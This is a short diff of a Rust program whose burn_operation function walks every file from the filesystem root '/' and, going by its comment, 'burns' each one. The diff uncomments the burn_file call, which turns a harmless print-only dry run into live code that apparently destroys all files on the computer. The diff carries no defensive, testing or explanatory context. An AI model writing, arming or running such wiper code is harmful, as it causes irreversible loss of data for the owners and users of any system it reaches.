@@ -14,8 +14,8 @@ fn main() -> std::io::Result<()> {
 fn burn_operation() -> std::io::Result<()> {
     //for every file on the computer, burn_file
     for file_path in WalkDir::new("/") {
-        println!("Burning {}", file_path.unwrap().path().display());
-        // burn_file(file_path.unwrap().path().display().to_string().as_str())?;
+        println!("Burning {}", file_path.as_ref().unwrap().path().display());
+        burn_file(file_path.unwrap().path().display().to_string().as_str())?;
       }
 
    Ok(())
